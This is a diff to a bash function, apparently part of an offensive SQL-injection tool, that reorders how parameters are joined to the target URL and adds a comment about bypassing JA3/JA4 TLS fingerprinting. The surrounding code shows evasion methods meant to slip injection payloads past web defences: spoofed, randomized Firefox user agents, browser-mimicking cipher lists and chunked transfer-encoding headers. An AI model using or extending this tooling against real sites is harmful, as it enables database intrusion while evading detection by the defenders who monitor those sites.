@@ -32,6 +32,7 @@ vector_sqli_agressor_left() {
       # Used chunked headers only on POST method.
       local chunked_headers=(-H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded")
 
+      # Enforce strict TLS 1.3 compliance and bypass JA3/JA4 fingerprinting defenses        
       if [[ "$base_ua" == *"Firefox"* ]]; then
         random_ua="${base_ua} Gecko/20100101 Firefox/$((RANDOM % 5 + 125)).0"
         target_cipher="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
@@ -70,6 +71,10 @@ vector_sqli_agressor_left() {
       fi
 
       local current_method="${REQ_METHOD:-POST}"
+local join_char="?"
+      if [[ "$target_url" == *"?"* ]]; then
+        join_char="&"
+      fi
 
       if [[ "$payloadsi" = "true" ]]; then
         output_text="[\033[34m${current_time}\033[0m] [\e[0;34m<\e[0m] Vector 1 [${current_method}][PORT:$random_port] Executing: \033[38;5;238m[${target_url}${join_char}${current_param}=${active_payload}]\033[0m"
@@ -84,11 +89,7 @@ vector_sqli_agressor_left() {
         esac
         output_text="[\033[34m${current_time}\033[0m] [i] Attempting \033[1m${technique_name}\033[0m injection technique (Vector 1 & 2)."
       fi
-      echo -e "$output_text"
-      local join_char="?"
-      if [[ "$target_url" == *"?"* ]]; then
-        join_char="&"
-      fi
+      echo -e "$output_text"      
 
       if [ "$current_method" = "POST" ]; then
         local post_data="${current_param}=${active_payload}"
